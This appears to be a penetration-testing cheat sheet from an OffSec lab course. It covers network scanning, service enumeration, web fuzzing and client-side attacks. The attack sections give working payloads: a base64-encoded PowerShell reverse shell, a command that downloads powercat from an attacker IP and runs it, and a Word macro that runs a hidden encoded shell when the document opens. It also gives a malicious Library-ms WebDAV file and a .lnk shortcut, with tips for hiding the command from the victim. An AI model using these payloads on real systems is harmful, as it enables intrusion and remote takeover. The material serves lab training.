# template

## Basics

### RDP session

```
xfreerdp /u:"offsec" /p:"lab" /v:"$TARGET" /cert-ignore /smart-sizing:2880x1800 /drive:/workspace,share

```

### Use AZERTY

Time & Language > Language & region > ... > Langage Options > Keyboards

### MTU

```
sudo ip link set dev tun0 mtu 1250
```





## Passive information gathering

* whois
* Google search
* crt.sh
*

## Scanning

### Ping sweep

```
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt --stats-every=5s
```

```
grep Up ping-sweep.txt | cut -d " " -f 2 > hosts.lst
```

### SYN-SCAN TCP of common ports

```
nmap -sS -iL hosts.lst --stats-every=5s
```

### Scan UDP of common ports

```
nmap -sS -iL hosts.lst --stats-every=5s
```

### SYN-SCAN TCP of all ports

```
nmap -sS -p- -iL hosts.lst --stats-every=5s
```

### Scan UDP of all ports

```
nmap -sU -p- -iL hosts.lst --stats-every=5s
```

### Global scan

```
nmap -sC -sV -oA nmap $TARGET  --stats-every=5s
```

## SMB Enumeration

```
nmap $TARGET -sV -sC -p139,445 --stats-every=5s
```

```
nmap -p445 --script=smb-enum-shares $TARGET --stats-every=5s
```

```
netexec smb $TARGET -u guest -p "" --shares
```

```
smbmap -u guest -H $TARGET -r ADMIN$
```

```
netexec smb $TARGET -u guest -p "" --users
```

```
smbclient -N -L //$TARGET
smbmap -H $TARGET
smbmap -H $TARGET -r notes
smbmap -H $TARGET --download "notes\note.txt"
smbmap -H $TARGET --upload test.txt "notes\test.txt"
```

## SMTP Enumeration

```
telnet $TARGET 25
```

```
nmap $TARGET -sC -sV -p25 --stats-every=5s
```

```
smtp-user-enum -U /opt/seclists/Usernames/top-usernames-shortlist.txt $TARGET 25 
```



## IMAP Enumeration

```
telnet $TARGET 143
```

```
1 LIST "" *
1 NO Authenticate first
1 LOGIN offsec lab
1 NO Invalid user name or password. Please use full email address as user name.

1 LOGOUT
```

## POP3 Enumeration

```
telnet $TARGET 110
```

```
+OK POP3
USER offsec PASS lab
+OK Send your password
PASS lab
-ERR Invalid user name or password. Please use full email address as user name.

```







## Web enumeration

Extension fuzzing

```
ffuf -w /opt/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$TARGET/indexFUZZ
```



Directory fuzzing&#x20;

```
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://$TARGET/FUZZ
```



## Common-Web attacks

### File upload

#### Generate payload

```
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.215",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```





## Client-side attack

### Information gathering

#### Analyzing metadata of a file (w/o interaction with target)

```
exiftool -a -u brochure.pdf
```

#### By Interacting with the target

```
gobuster dir -u http://$TARGET -w /opt/seclists/Discovery/Web-Content/big.txt  -x .pdf -o results.txt

```

Or using [https://github.com/v0re/dirb/blob/master/wordlists/common.txt](https://github.com/v0re/dirb/blob/master/wordlists/common.txt)

### Microsoft Office

Prepare powercat.ps1 on host machine

```
python3 -m http.server 80
```



Payload :

```
pwsh

$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.200/powercat.ps1');powercat -c 192.168.45.200 -p 4444 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```

Cut by script.py&#x20;

<pre><code>str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"
<strong>
</strong>n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
</code></pre>

We obtain

```
Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
Str = Str + "ALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAY"
Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwA"
Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
Str = Str + "A"

```

Macro Reverse shell

<pre><code>Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
<strong>    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
</strong>    Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
    Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
    Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
    Str = Str + "ALgAxADYAOAAuADQANQAuADIAMAAwAC8AcABvAHcAZQByAGMAY"
    Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
    Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACAALQBwA"
    Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
    Str = Str + "A"


    CreateObject("Wscript.Shell").Run Str
End Sub
</code></pre>

### Windows Library Files

**.Library-ms** file extension : it connects users with data stored in remote locations like web services or shares

#### Install webdav

```
pip3 install wsgidav

pip install wsgidav cheroot

```

#### Set up webdav share

```
touch /home/test.txt

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/
```

#### Create config.Library-ms on target

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.192</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

```

When the file has been clicked , we need to remove the serialized tag that windows adds in the XML in order to use this malicious file again on an other target

#### Create a malicious .lnk

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.192:8000/powercat.ps1'); powercat -c 192.168.45.192 -p 4444 -e powershell"
```

\--> To be more stealthy , on can add basic commands and insert blanks before the reverse shell command so the malicious command will be out of the visible area for the user

#### Listening for reverse shell

```
// Where powercat.ps1 is located

python3 -m http.server 8000
```

```
nc -lvnp 4444
```













